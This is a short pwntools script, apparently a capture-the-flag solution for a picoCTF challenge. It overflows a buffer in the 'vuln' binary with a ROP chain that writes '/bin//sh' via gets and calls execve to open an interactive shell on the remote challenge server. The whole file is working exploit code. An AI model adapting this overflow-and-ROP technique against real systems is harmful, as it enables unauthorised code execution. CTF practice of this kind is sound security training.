from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.kernel = "amd64"

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("saturn.picoctf.net", 64182)

    return r

def main():

    r = conn()
    # r = gdb.debug(exe.path, '''
    #     break *0x08049db4
    #     break *0x08049dc0
    #     continue
    #     ''')

    print(r.recvuntil(b'grasshopper!'))

    payload = b"B" * 28

    rop = ROP(exe)
    rop.gets(0x080e5060)
    rop.execve(0x080e5060, 0, 0)
    print(rop.dump())
    payload += rop.chain()

    print(payload.hex())
    print(payload)

    r.sendline(payload)
    r.sendline(b"/bin//sh") # /bin/sh does not work well.

    r.interactive()


if __name__ == "__main__":
    main()
